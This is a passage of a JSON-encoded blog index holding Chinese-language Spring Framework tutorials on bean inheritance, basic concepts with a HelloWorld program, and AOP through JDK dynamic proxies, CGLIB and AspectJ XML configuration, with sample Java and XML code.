http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\"&gt; &lt;property name=\"message1\" value=\"Father's Message1\"/&gt; &lt;property name=\"message2\" value=\"Father's Message2\"/&gt; &lt;/bean&gt; &lt;bean id=\"son\" class=\"com.mi1k7ea.Son\" parent=\"helloWorld\"&gt; &lt;property name=\"message1\" value=\"Son's Message1\"/&gt; &lt;property name=\"message3\" value=\"Son's Message3\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 输出： Bean定义模板此外，还可以定义一个Bean定义模板，不用指定class的属性，而应该指定带true值的abstract属性： 12345678910111213141516171819&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"beanTeamplate\" abstract=\"true\"&gt; &lt;property name=\"message1\" value=\"A\"/&gt; &lt;property name=\"message2\" value=\"B\"/&gt; &lt;property name=\"message3\" value=\"C\"/&gt; &lt;/bean&gt; &lt;bean id=\"son\" class=\"com.mi1k7ea.Son\" parent=\"beanTeamplate\"&gt; &lt;property name=\"message1\" value=\"new A\"/&gt; &lt;property name=\"message3\" value=\"new C\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 此时beanTeamplate为父Bean，由于标记为抽象的，因此只作为模板给子Bean使用而不会被实例化。","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"Spring基础篇之基本概念","date":"2019-01-01T13:25:31.000Z","path":"2019/01/01/Spring基础篇之基本概念/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 Spring简介Spring是一个轻量级的Java Web开发框架，是分层的Java SE/EE full-stack轻量级开源框架，以IoC（Inverse of Control，控制反转）和AOP（Aspect Oriented Programming，面向切面编程）为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。 Spring的优点如下： 方便解耦，简化开发：Spring就是一个大工厂，可以将所有对象的创建和依赖关系的维护交给Spring管理； 方便集成各种优秀框架：Spring不排斥各种优秀的开源框架，其内部提供了对各种优秀框架（如Struts2、Hibernate、MyBatis等）的直接支持； 降低Java EE API的使用难度：Spring对Java EE开发中非常难用的一些API（JDBC、JavaMail、远程调用等）都提供了封装，使这些API应用的难度大大降低； 方便程序的测试：Spring支持JUnit4，可以通过注解方便地测试Spring程序； AOP编程的支持：Spring提供面向切面编程，可以方便地实现对程序进行权限拦截和运行监控等功能； 声明式事务的支持：只需要通过配置就可以完成对事务的管理，而无须手动编程； 0x02 Spring体系结构Spring框架采用分层架构，根据不同的功能被划分成了多个模块，这些模块大体可分为Data Access/Integration、Web、AOP、Aspects、Messaging、Instrumentation、Core Container和Test，如图： Core Container（核心容器）Spring的核心容器是其他模块建立的基础，由Beans模块、Core核心模块、Context上下文模块和Expression Language表达式语言模块组成，具体介绍如下： Core模块：提供了框架的基本组成部分，包括IoC和依赖注入功能； Beans模块 ：提供BeanFactory，是工厂模式的经典实现，Spring将管理对象称为Bean； Context模块：是在Core和Beans模块的基础上建立起来的，以一种类似于JNDI注册的方式访问对象，是访问定义和配置任何对象的媒介。ApplicationContext接口是上下文模块的焦点； SpEL模块：提供了强大的表达式语言，用于在运行时查询和操作对象图； 它们之间的完整依赖关系如下： Data Access/Integration（数据访问/集成）数据访问/集成层包括JDBC、ORM、OXM、JMS和Transactions模块（注：JDBC=Java Data Base Connectivity，ORM=Object Relational Mapping，OXM=Object XML Mapping，JMS=Java Message Service），它们的细节如下： JDBC模块：提供了JDBC抽象层，大幅度减少了在开发过程中对数据库操作的编码； ORM模块：提供了对流行的对象关系映射API的集成，包括JPA、JDO和Hibernate等。通过此模块可以让这些ORM框架和spring的其它功能整合，比如前面提及的事务管理； OXM模块：提供了一个支持对象/XML映射的抽象层实现，如JAXB、Castor、XMLBeans、JiBX和XStream； JMS模块：指Java消息服务，包含的功能为生产和消费的信息。从Spring 4.1开始，集成了spring-messaging模块； Transactions事务模块：为实现特殊接口类及所有的POJO支持编程式和声明式事务管理（注：编程式事务需要自己写beginTransaction()、commit()、rollback()等事务管理方法，声明式事务是通过注解或配置由spring自动处理，编程式事务粒度更细）； Web模块Spring的Web层包括Web、Servlet、Struts和Portlet组件，具体介绍如下： Web模块：提供面向Web的基本功能和面向Web的应用上下文，比如多部分（multipart）文件上传功能、使用Servlet监听器初始化IoC容器等。它还包括HTTP客户端以及Spring远程调用中与web相关的部分； Servlet模块：包括Spring模型—视图—控制器（MVC）实现Web应用程序； MVC模块：为Web应用提供了模型视图控制（MVC）和REST Web服务的实现。Spring的MVC框架可以使领域模型代码和Web表单完全地分离，且可以与Spring框架的其它所有功能进行集成； WebSocket模块：为WebSocket-based提供了支持，而且在Web应用程序中提供了客户端和服务器端之间通信的两种方式； Struts模块：包含支持类内的Spring应用程序，集成了经典的Struts Web层； Portlet模块：提供了在Portlet环境中使用MVC实现，类似Web-Servlet模块的功能，并反映了spring-webmvc模块的功能； 其他模块Spring的其他模块还有 AOP、Aspects、Instrumentation 以及 Test 模块，具体介绍如下： AOP模块：提供了面向切面编程实现，允许定义方法拦截器和切入点，将代码按照功能进行分离，以降低耦合性； Aspects模块：提供与AspectJ的集成，是一个功能强大且成熟的面向切面编程（AOP）框架； Instrumentation模块：提供了类工具的支持和类加载器的实现，可以在特定的应用服务器中使用； Test模块：支持Spring组件使用JUnit或TestNG框架的测试； Messaging模块：为STOMP提供了支持作为在应用程序中WebSocket子协议的使用。它也支持一个注解编程模型，它是为了选路和处理来自WebSocket客户端的STOMP信息； 0x03 Spring开发环境准备使用Spring框架时，只需将Spring的四个基础包和commons-logging包复制到项目的lib目录并发布到类路径中即可。 Spring相关包下载地址：http://repo.spring.io/simple/libs-release-local/org/springframework/spring/ commons-logging包下载地址：http://commons.apache.org/proper/commons-logging/download_logging.cgi 本地环境用的：spring-framework-4.1.6.RELEASE-dist，commons-logging-1.2。 0x04 Spring目录结构和基础jar包解压并打开我们下载的spring-framework-4.1.6.RELEASE-dist可看到Spring有如下目录： 名称 作用 docs 包含 Spring 的 API 文档和开发规范 libs 包含开发需要的 JAR 包和源码包 schema 包含开发所需要的 schema 文件，在这些文件中定义了 Spring 相关配置文件的约束 在libs目录中，包含了Spring框架提供的所有JAR文件，其中有四个JAR文件是Spring框架的基础包，分别对应Spring容器的四个模块，具体如下： 名称 作用 spring-core-4.1.6.RELEASE.jar 包含 Spring 框架基本的核心工具类，Spring 其他组件都要用到这个包中的类，是其他组件的基本核心。 spring-beans-4.1.6.RELEASE.jar 所有应用都要用到的，它包含访问配置文件、创建和管理 bean 以及进行 Inversion of Control（IoC）或者 Dependency Injection（DI）操作相关的所有类。 spring-context-4.1.6.RELEASE.jar Spring 提供在基础 IoC 功能上的扩展服务，此外还提供许多企业级服务的支持，如邮件服务、任务调度、JNDI 定位、EJB 集成、远程访问、缓存以及各种视图层框架的封装等 spring-expression-4.1.6.RELEASE.jar 定义了 Spring 的表达式语言。 需要注意的是，在使用 Spring 开发时，除了 Spring 自带的 JAR 包以外，还需要一个第三方 JAR 包 commons.logging 处理日志信息 0x05 第一个Spring程序——HelloWorld在IDEA新建项目，右键项目目录-&gt;Open Module Settings-&gt;Project Settings-&gt;Libraries中添加Springframework的包和commons-logging的包。 接着在src目录下新建com.mi1k7ea包，在其中新建HelloWorld.java和MainApp.java文件。 HelloWorld.java，是一个Bean： 12345678910111213package com.mi1k7ea;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125;&#125; MainApp.java，： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); &#125;&#125; 关于主要程序有以下两个要点需要注意： 第一个是我们使用框架的ClassPathXmlApplicationContext()函数来创建应用程序的上下文。这个API加载beans的配置文件并最终基于所提供的API，它处理创建并初始化所有的对象，即在配置文件中提到的beans； 第二个是使用已创建的上下文的getBean()方法来获得所需的bean。这个方法使用bean的ID返回一个最终可以转换为实际对象的通用对象。一旦有了对象，你就可以使用这个对象调用任何类的方法； 另外，还需要在src目录下创建一个Bean的XML配置文件，作为粘合Bean的粘合剂即类。Spring的配置文件名称是可以自定义的，一般情况下是命名为applicationContext.xml（或bean.xml），这里我们定义为Beans.xml，其中beans标签中的各个属性是Spring的约束配置： 123456789&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\"&gt; &lt;property name=\"message\" value=\"mi1k7ea\"/&gt; &lt;/bean&gt;&lt;/beans&gt; Beans.xml用于给不同的Bean分配唯一的ID，并且控制不同值的对象的创建，而不会影响Spring的任何源文件。这里给com.mi1k7ea.HelloWorld这个Bean分配了值为helloWorld的id，在MainApp主程序中通过传入id参数调用getBean()即可成功获取到指定的Bean。 运行输出如下，可以看到，在程序执行时对象的创建并不是通过new一个类完成的，而是由Spring容器管理实现的，这就是后面讲到的Spring IoC容器思想的工作机制：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"Spring基础篇之AOP","date":"2019-01-01T10:23:52.000Z","path":"2019/01/01/Spring基础篇之AOP/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 Spring AOPAOP的全称是“Aspect Oriented Programming”，即面向切面编程，它将业务逻辑的各个部分进行隔离，使开发人员在编写业务逻辑时可以专心于核心业务，从而提高了开发效率。 AOP采取横向抽取机制，取代了传统纵向继承体系的重复性代码，其应用主要体现在事务处理、日志管理、权限控制、异常处理等方面。 目前最流行的AOP框架有两个： Spring AOP:使用纯Java实现，不需要专门的编译过程和类加载器，在运行期间通过代理方式向目标类植入增强的代码； AspectJ:是一个基于Java语言的AOP框架，从Spring 2.0开始，Spring AOP引入了对AspectJ的支持。AspectJ扩展了Java语言，提供了一个专门的编译器，在编译时提供横向代码的植入； 0x02 AOP术语AOP相关术语如下： 名称 说明 Joinpoint（连接点） 指那些被拦截到的点，在Spring中，可以被动态代理拦截目标类的方法。 Pointcut（切入点） 指要对哪些Joinpoint进行拦截，即被拦截的连接点。 Advice（通知） 指拦截到Joinpoint之后要做的事情，即对切入点增强的内容。 Target（目标） 指代理的目标对象。 Weaving（植入） 指把增强代码应用到目标上，生成代理对象的过程。 Proxy（代理） 指生成的代理对象。 Aspect（切面） 切入点和通知的结合。 0x03 JDK动态代理在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。 注意，JDK提供的代理只能针对接口做代理。 具体更多的可参考之前的文章：Java动态代理机制 Demo除了前面的参考文章中的例子外，再看个模拟使用JDK动态代理实现AOP的例子。 CustomerDao.java，接口类： 12345678package com.mi1k7ea;public interface CustomerDao &#123; public void add(); // 添加 public void update(); // 修改 public void delete(); // 删除 public void find(); // 查询&#125; CustomerDaoImpl.java，实现CustomerDao接口类： 1234567891011121314151617181920package com.mi1k7ea;public class CustomerDaoImpl implements CustomerDao &#123; @Override public void add() &#123; System.out.println(\"CustomerDaoImpl.add()\"); &#125; @Override public void update() &#123; System.out.println(\"CustomerDaoImpl.update()\"); &#125; @Override public void delete() &#123; System.out.println(\"CustomerDaoImpl.delete()\"); &#125; @Override public void find() &#123; System.out.println(\"CustomerDaoImpl.find()\"); &#125;&#125; MyAspect.java，切面类，定义了两个增强的方法，分别为myBefore()和myAfter()方法，用于对目标类CustomerDaoImpl进行增强： 1234567891011package com.mi1k7ea;public class MyAspect &#123; public void myBefore() &#123; System.out.println(\"方法执行之前\"); &#125; public void myAfter() &#123; System.out.println(\"方法执行之后\"); &#125;&#125; MyBeanFactory.java，代理类，使用java.lang.reflect.Proxy实现JDK动态代理，定义了一个静态的getBean()方法，这里模拟Spring框架的IoC思想，通过调用getBean()方法创建CustomerDao实例，其中Proxy.newProxyInstance()方法的第一个参数是当前类的类加载器，第二参数是所创建实例的实现类的接口，第三个参数就是需要增强的方法；在目标类方法执行的前后，分别执行切面类中的myBefore()方法和myAfter()方法： 1234567891011121314151617181920212223242526package com.mi1k7ea;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class MyBeanFactory &#123; public static CustomerDao getBean() &#123; // 准备目标类 final CustomerDao customerDao = new CustomerDaoImpl(); // 创建切面类实例 final MyAspect myAspect = new MyAspect(); // 使用代理类，进行增强 return (CustomerDao) Proxy.newProxyInstance( MyBeanFactory.class.getClassLoader(), new Class[] &#123; CustomerDao.class &#125;, new InvocationHandler() &#123; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; myAspect.myBefore(); // 前增强 Object obj = method.invoke(customerDao, args); myAspect.myAfter(); // 后增强 return obj; &#125; &#125;); &#125;&#125; MainApp.java，在调用代理类的getBean()方法时，获取的是CustomerDao类的代理对象，然后调用了该对象中的方法： 12345678910111213package com.mi1k7ea;public class MainApp &#123; public static void main(String[] args) &#123; // 从工厂获得指定的内容（相当于spring获得，但此内容时代理对象） CustomerDao customerDao = MyBeanFactory.getBean(); // 执行方法 customerDao.add(); customerDao.update(); customerDao.delete(); customerDao.find(); &#125;&#125; 输出如下，说明成功通过JDK动态代理实现AOP： 0x04 CGLIB动态代理 JDK动态代理使用起来非常简单，但是存在一定的局限性，即只能对接口进行代理、不能对普通的类进行代理，如果不希望实现接口，则可以使用CGLIB代理。 CGLIB（Code Generation Library）是一个高性能开源的代码生成包，它被许多AOP框架所使用，其底层是通过使用一个小而快的字节码处理框架ASM（Java字节码操控框架）转换字节码并生成新的类。因此CGLIB要依赖于ASM的包，解压Spring的核心包spring-core的jar包，其中包含asm和cglib目录，也就是说Spring的核心包已经集成了CGLIB所需要的包，所以在开发中不需要另外导入ASM的JAR包了： 网上找的两者的区别如下： Java动态代理是利用反射机制生成一个实现代理接口的匿名类，在调用具体方法前调用InvokeHandler来处理。 而cglib动态代理是利用asm开源包，对代理对象类的class文件加载进来，通过修改其字节码生成子类来处理。 1、如果目标对象实现了接口，默认情况下会采用JDK的动态代理实现AOP2、如果目标对象实现了接口，可以强制使用CGLIB实现AOP 3、如果目标对象没有实现了接口，必须采用CGLIB库，spring会自动在JDK动态代理和CGLIB之间转换 如何强制使用CGLIB实现AOP？ （1）添加CGLIB库，SPRING_HOME/cglib/*.jar （2）在spring配置文件中加入&lt;aop:aspectj-autoproxy proxy-target-class=”true”/&gt; JDK动态代理和CGLIB字节码生成的区别？ （1）JDK动态代理只能对实现了接口的类生成代理，而不能针对类 （2）CGLIB是针对类实现代理，主要是对指定的类生成一个子类，覆盖其中的方法 DemoGoodsDao.java，被代理的非接口类： 12345678910111213141516package com.mi1k7ea;public class GoodsDao &#123; public void add() &#123; System.out.println(\"添加商品...\"); &#125; public void update() &#123; System.out.println(\"修改商品...\"); &#125; public void delete() &#123; System.out.println(\"删除商品...\"); &#125; public void find() &#123; System.out.println(\"修改商品...\"); &#125;&#125; MyBeanFactory.java，CGLIB代理类，应用了CGLIB的核心类Enhancer，调用了Enhancer.setSuperclass()方法确定被代理的类GoodsDao；然后调用setCallback()方法添加回调函数，其中intercept()方法相当于JDK动态代理方式中创建的invoke()方法，该方法会在目标方法执行的前后，对切面类中的方法进行增强；最后调用Enhancer.create()方法创建代理类并返回： 1234567891011121314151617181920212223242526272829303132333435package com.mi1k7ea;import org.springframework.cglib.proxy.Enhancer;import org.springframework.cglib.proxy.MethodInterceptor;import org.springframework.cglib.proxy.MethodProxy;import java.lang.reflect.Method;public class MyBeanFactory &#123; public static GoodsDao getBean() &#123; // 准备目标类 final GoodsDao goodsDao = new GoodsDao(); // 创建切面类实例 final MyAspect myAspect = new MyAspect(); // 生成代理类，CGLIB在运行时，生成指定对象的子类，增强 Enhancer enhancer = new Enhancer(); // 确定需要增强的类 enhancer.setSuperclass(goodsDao.getClass()); // 添加回调函数 enhancer.setCallback(new MethodInterceptor() &#123; // intercept 相当于 jdk invoke，前三个参数与 jdk invoke—致 @Override public Object intercept(Object proxy, Method method, Object[] args, MethodProxy methodProxy) throws Throwable &#123; myAspect.myBefore(); // 前增强 Object obj = method.invoke(goodsDao, args); // 目标方法执行 myAspect.myAfter(); // 后增强 return obj; &#125; &#125;); // 创建代理类 GoodsDao goodsDaoProxy = (GoodsDao) enhancer.create(); return goodsDaoProxy; &#125;&#125; MainApp.java，调用CGLIB代理类的getBean()方法，实际获取的是GoodsDao的代理对象并调用其方法： 12345678910111213package com.mi1k7ea;public class MainApp &#123; public static void main(String[] args) &#123; // 从工厂获得指定的内容（相当于spring获得，但此内容时代理对象） GoodsDao goodsDao = MyBeanFactory.getBean(); // 执行方法 goodsDao.add(); goodsDao.update(); goodsDao.delete(); goodsDao.find(); &#125;&#125; 运行输出： 0x05 Spring通知类型通知（Advice）其实就是对目标切入点进行增强的内容，Spring AOP为通知（Advice）提供了org.aopalliance.aop.Advice接口。 Spring通知按照在目标类方法的连接点位置，可以分为以下五种类型： 名称 说明 org.springframework.aop.MethodBeforeAdvice（前置通知） 在方法之前自动执行的通知称为前置通知，可以应用于权限管理等功能。 org.springframework.aop.AfterReturningAdvice（后置通知） 在方法之后自动执行的通知称为后置通知，可以应用于关闭流、上传文件、删除临时文件等功能。 org.aopalliance.intercept.MethodInterceptor（环绕通知） 在方法前后自动执行的通知称为环绕通知，可以应用于日志、事务管理等功能。 org.springframework.aop.ThrowsAdvice（异常通知） 在方法抛出异常时自动执行的通知称为异常通知，可以应用于处理异常记录日志等功能。 org.springframework.aop.IntroductionInterceptor（引介通知） 在目标类中添加一些新的方法和属性，可以应用于修改旧版本程序（增强类）。 0x06 创建AOP代理Spring创建一个AOP代理的基本方法是使用org.springframework.aop.framework.ProxyFactoryBean，这个类对应的切入点和通知提供了完整的控制能力，并可以生成指定的内容。 ProxyFactoryBean类中的常用可配置属性如下： 属性名称 描 述 target 代理的目标对象 proxyInterfaces 代理要实现的接口，如果有多个接口，则可以使用以下格式赋值： &lt;list&gt; &lt;value &gt;&lt;/value&gt; ... &lt;/list&gt; proxyTargetClass 是否对类代理而不是接口，设置为 true 时，使用 CGLIB 代理 interceptorNames 需要植入目标的 Advice singleton 返回的代理是否为单例，默认为 true（返回单实例） optimize 当设置为 true 时，强制使用 CGLIB Demo在Spring通知中，环绕通知是一个非常典型的应用。下面通过环绕通知的案例演示Spring创建AOP代理的过程。 除了SpringFramework的jar包外，还需要com.springsource.org.aopalliance-1.0.0.jar。 CustomerDao.java和CustomerDaoImpl.java不变。 MyAspect.java，实现了MethodInterceptor接口，并实现了接口的invoke()方法；MethodInterceptor接口是Spring AOP的JAR包提供的，而invoke()方法用于确定目标方法mi，并告诉Spring要在目标方法前后执行哪些方法： 123456789101112131415package com.mi1k7ea;import org.aopalliance.intercept.MethodInterceptor;import org.aopalliance.intercept.MethodInvocation;//需要实现接口，确定哪个通知，及告诉Spring应该执行哪个方法public class MyAspect implements MethodInterceptor &#123; public Object invoke(MethodInvocation mi) throws Throwable &#123; System.out.println(\"方法执行之前\"); // 执行目标方法 Object obj = mi.proceed(); System.out.println(\"方法执行之后\"); return obj; &#125;&#125; MainApp.java： 123456789101112131415package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext = new ClassPathXmlApplicationContext(\"Beans.xml\"); CustomerDao customerDao = (CustomerDao) applicationContext.getBean(\"customerDaoProxy\"); customerDao.add(); customerDao.update(); customerDao.delete(); customerDao.find(); &#125;&#125; Beans.xml，首先配置目标类和通知，然后使用ProxyFactoryBean类生成代理对象；其中配置代理实现的接口、代理的目标对象以及需要植入目标的通知；最后设置value属性值为true时，表示使用CGLIB代理，属性值为false时，表示使用JDK动态代理： 12345678910111213141516171819202122232425&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;!--目标类 --&gt; &lt;bean id=\"customerDao\" class=\"com.mi1k7ea.CustomerDaoImpl\" /&gt; &lt;!-- 通知 advice --&gt; &lt;bean id=\"myAspect\" class=\"com.mi1k7ea.MyAspect\" /&gt; &lt;!--生成代理对象 --&gt; &lt;bean id=\"customerDaoProxy\" class=\"org.springframework.aop.framework.ProxyFactoryBean\"&gt; &lt;!--代理实现的接口 --&gt; &lt;property name=\"proxyInterfaces\" value=\"com.mi1k7ea.CustomerDao\" /&gt; &lt;!--代理的目标对象 --&gt; &lt;property name=\"target\" ref=\"customerDao\" /&gt; &lt;!--用通知增强目标 --&gt; &lt;property name=\"interceptorNames\" value=\"myAspect\" /&gt; &lt;!-- 如何生成代理，true:使用cglib; false :使用jdk动态代理 --&gt; &lt;property name=\"proxyTargetClass\" value=\"true\" /&gt; &lt;/bean&gt;&lt;/beans&gt; 运行输出： 0x07 使用AspectJ开发AOPAspectJ是一个基于Java语言的AOP框架，它扩展了Java语言。Spring 2.0以后，新增了对AspectJ方式的支持，新版本的Spring框架，建议使用AspectJ方式开发AOP。 使用AspectJ开发AOP通常有两种方式： 基于XML的声明式 基于Annotation的声明式 基于XML的声明式基于XML的声明式是指通过Spring配置文件的方式定义切面、切入点及声明通知，而所有的切面和通知都必须定义在&lt;aop:config&gt;元素中。 通过XML架构来实现的AOP，为了能使用aop命名空间标签，你需要导入spring-aop j架构，如下： 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd \"&gt; &lt;!-- bean definition &amp; AOP specific configuration --&gt;&lt;/beans&gt; 此外，还需要在ClassPath中使用以下AspectJ库文件：aspectjrt.jar、aspectjweaver.jar、aspectj.jar、aopalliance.jar。 声明aspect一个aspect是使用aop元素声明的，支持的bean是使用ref属性引用的，如下所示： 12345678&lt;aop:config&gt; &lt;aop:aspect id=\"myAspect\" ref=\"aBean\"&gt; ... &lt;/aop:aspect&gt;&lt;/aop:config&gt;&lt;bean id=\"aBean\" class=\"...\"&gt;...&lt;/bean&gt; 这里，“aBean” 将被配置和依赖注入，就像前面的章节中你看到的其他的Spring Bean一样。 声明切入点一个切入点有助于确定使用不同建议执行的感兴趣的连接点（即方法）。在处理基于配置的XML架构时，切入点将会按照如下所示定义： 12345678910&lt;aop:config&gt; &lt;aop:aspect id=\"myAspect\" ref=\"aBean\"&gt; &lt;aop:pointcut id=\"businessService\" expression=\"execution(* com.xyz.myapp.service.*.*(..))\"/&gt; ... &lt;/aop:aspect&gt;&lt;/aop:config&gt;&lt;bean id=\"aBean\" class=\"...\"&gt;...&lt;/bean&gt; 下面的示例定义了一个名为“businessService”的切入点，该切入点将与com.mi1k7ea包下的Student类中的getName()方法相匹配： 12345678910&lt;aop:config&gt; &lt;aop:aspect id=\"myAspect\" ref=\"aBean\"&gt; &lt;aop:pointcut id=\"businessService\" expression=\"execution(* com.mi1k7ea.Student.getName(..))\"/&gt; ... &lt;/aop:aspect&gt;&lt;/aop:config&gt;&lt;bean id=\"aBean\" class=\"...\"&gt;...&lt;/bean&gt; 声明建议你可以使用&lt;aop:{ADVICE NAME}&gt;元素在一个aspect中声明五个建议中的任何一个，如下所示： 1234567891011121314151617181920212223242526272829&lt;aop:config&gt; &lt;aop:aspect id=\"myAspect\" ref=\"aBean\"&gt; &lt;aop:pointcut id=\"businessService\" expression=\"execution(* com.xyz.myapp.service.*.*(..))\"/&gt; &lt;!-- a before advice definition --&gt; &lt;aop:before pointcut-ref=\"businessService\" method=\"doRequiredTask\"/&gt; &lt;!-- an after advice definition --&gt; &lt;aop:after pointcut-ref=\"businessService\" method=\"doRequiredTask\"/&gt; &lt;!-- an after-returning advice definition --&gt; &lt;!--The doRequiredTask method must have parameter named retVal --&gt; &lt;aop:after-returning pointcut-ref=\"businessService\" returning=\"retVal\" method=\"doRequiredTask\"/&gt; &lt;!-- an after-throwing advice definition --&gt; &lt;!--The doRequiredTask method must have parameter named ex --&gt; &lt;aop:after-throwing pointcut-ref=\"businessService\" throwing=\"ex\" method=\"doRequiredTask\"/&gt; &lt;!-- an around advice definition --&gt; &lt;aop:around pointcut-ref=\"businessService\" method=\"doRequiredTask\"/&gt; ... &lt;/aop:aspect&gt;&lt;/aop:config&gt;&lt;bean id=\"aBean\" class=\"...\"&gt;...&lt;/bean&gt; 你可以对不同的建议使用相同的doRequiredTask或者不同的方法。这些方法将会作为aspect模块的一部分来定义。 Demo除了当前环境已有的jar包外，还需要添加com.springsource.org.aspectj.weaver-1.6.8.RELEASE.jar。 Student.java，拥有name和age属性及其getter和setter方法，同时还定义了一个打印并抛出错误信息的函数： 123456789101112131415161718192021222324package com.mi1k7ea;public class Student &#123; private Integer age; private String name; public void setAge(Integer age) &#123; this.age = age; &#125; public Integer getAge() &#123; System.out.println(\"Age : \" + age ); return age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; System.out.println(\"Name : \" + name ); return name; &#125; public void printThrowException()&#123; System.out.println(\"Exception raised\"); throw new IllegalArgumentException(); &#125;&#125; Logging.java，实际上是aspect模块的一个示例，定义了在各个点调用的方法： 1234567891011121314151617181920212223242526272829303132package com.mi1k7ea;public class Logging &#123; /** * This is the method which I would like to execute * before a selected method execution. */ public void beforeAdvice()&#123; System.out.println(\"Going to setup student profile.\"); &#125; /** * This is the method which I would like to execute * after a selected method execution. */ public void afterAdvice()&#123; System.out.println(\"Student profile has been setup.\"); &#125; /** * This is the method which I would like to execute * when any method returns. */ public void afterReturningAdvice(Object retVal)&#123; System.out.println(\"Returning:\" + retVal.toString() ); &#125; /** * This is the method which I would like to execute * if there is an exception raised. */ public void AfterThrowingAdvice(IllegalArgumentException ex)&#123; System.out.println(\"There has been an exception: \" + ex.toString()); &#125;&#125; MainApp.java： 1234567891011121314package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"Beans.xml\"); Student student = (Student) context.getBean(\"student\"); student.getName(); student.getAge(); student.printThrowException(); &#125;&#125; Beans.xml，注意这里aop:pointcut配置了切入点，通知需要增强哪些方法，： 1234567891011121314151617181920212223242526272829&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-3.0.xsd \"&gt; &lt;aop:config&gt; &lt;aop:aspect id=\"log\" ref=\"logging\"&gt; &lt;aop:pointcut id=\"selectAll\" expression=\"execution(* com.mi1k7ea.*.*(..))\"/&gt; &lt;aop:before pointcut-ref=\"selectAll\" method=\"beforeAdvice\"/&gt; &lt;aop:after pointcut-ref=\"selectAll\" method=\"afterAdvice\"/&gt; &lt;aop:after-returning pointcut-ref=\"selectAll\" returning=\"retVal\" method=\"afterReturningAdvice\"/&gt; &lt;aop:after-throwing pointcut-ref=\"selectAll\" throwing=\"ex\" method=\"AfterThrowingAdvice\"/&gt; &lt;/aop:aspect&gt; &lt;/aop:config&gt; &lt;!-- Definition for student bean --&gt; &lt;bean id=\"student\" class=\"com.mi1k7ea.Student\"&gt; &lt;property name=\"name\" value=\"mi1k7ea\" /&gt; &lt;property name=\"age\" value=\"6\"/&gt; &lt;/bean&gt; &lt;!-- Definition for logging aspect --&gt; &lt;bean id=\"logging\" class=\"com.mi1k7ea.Logging\"/&gt;&lt;/beans&gt; 运行输出如下： 如果只是想声明某个特定的方法为切入点，则可修改*为具体的类方法，如： 1234567891011121314151617181920212223242526272829&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd 